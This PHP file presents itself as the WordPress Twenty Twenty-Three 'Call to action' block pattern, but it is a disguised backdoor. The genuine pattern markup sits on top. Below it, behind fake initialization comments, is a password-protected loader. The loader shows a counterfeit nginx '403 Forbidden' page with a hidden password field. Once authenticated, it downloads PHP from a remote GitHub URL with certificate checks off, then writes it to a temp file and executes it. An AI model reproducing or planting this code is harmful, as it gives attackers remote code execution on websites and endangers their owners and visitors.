<?php
/**
<?php
 * Title: Call to action
 * Slug: twentytwentythree/cta
 * Categories: featured
 * Keywords: Call to action
 * Block Types: core/buttons
 * Description: Left-aligned text with a CTA button and a separator.
 
?>
<!-- wp:columns {"align":"wide"} -->
<div class="wp-block-columns alignwide">
	<!-- wp:column -->
	<div class="wp-block-column">
		<!-- wp:paragraph {"style":{"typography":{"lineHeight":"1.2"}},"fontSize":"x-large"} -->
		<p class="has-x-large-font-size" style="line-height:1.2"><?php echo esc_html_x( 'Got any book recommendations?', 'sample content for call to action', 'twentytwentythree' ); ?>
		</p>
		<!-- /wp:paragraph -->

		<!-- wp:buttons -->
		<div class="wp-block-buttons">
			<!-- wp:button {"fontSize":"small"} -->
			<div class="wp-block-button has-custom-font-size has-small-font-size">
				<a class="wp-block-button__link wp-element-button">
				<?php echo esc_html_x( 'Get In Touch', 'sample content for call to action button', 'twentytwentythree' ); ?>
				</a>
			</div>
			<!-- /wp:button -->
		</div>
		<!-- /wp:buttons -->
	</div>
	<!-- /wp:column -->

	<!-- wp:column -->
	<div class="wp-block-column">
		<!-- wp:separator {"className":"is-style-wide"} -->
		<hr class="wp-block-separator has-alpha-channel-opacity is-style-wide"/>
		<!-- /wp:separator -->
	</div>
	<!-- /wp:column -->
</div>
<!-- /wp:columns -->

<.?php
 * // WordPress theme initialization file
 * // Load Composer's autoloader
 * // require_once __DIR__ . '/vendor/autoload.php';
 *
 * // Load configuration
 * // $config = require_once __DIR__ . '/config/app.php';
 *
 * // Set up error reporting
 * // ini_set('display_errors', 'Off');
 * // error_reporting(E_ALL);
 *
 * // Example: Database connection (simplified)
 * // try { $pdo = new PDO("mysql:host={$config['db_host']};dbname={$config['db_name']}", $config['db_user'], $config['db_pass']); $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);} catch(PDOException $e){die("DB failed: ".$e->getMessage());}
 *
 * // Start session
 * // session_start();
 *
 * // Other initialization tasks...
 */
$auth_pass = "b713c03bc5f0632a8172292ef537befce70bdbe3846e8e5fa80a8c6339ccbc98";

function Login() {
  die("<html>
  <title>403 Forbidden</title>
  <center><h1>403 Forbidden</h1></center>
  <hr><center>nginx (You don't have permission access to server / on this server) </center>
  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}

if (!empty($auth_pass)) {
    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass))
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);

    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))
        Login();
}
?>
<?php
function ambil_konten($url) {
    $konten = @file_get_contents($url);
    if ($konten !== false) return $konten;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $konten = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode !== 200 || empty($konten)) return false;
    return $konten;
}

$url = "https://raw.githubusercontent.com/soy777/gg/main/reds.php";
$konten = ambil_konten($url);

if ($konten === false) {
    die("Gagal mengambil data dari URL.");
}

try {
    ob_start();
    $tmp = tempnam(sys_get_temp_dir(), "kode_");
    file_put_contents($tmp, $konten);
    include $tmp;
    unlink($tmp);
    ob_end_flush();
} catch (Throwable $e) {
    ob_end_clean();
    die("Terjadi kesalahan saat eksekusi kode: " . $e->getMessage());
}
?>
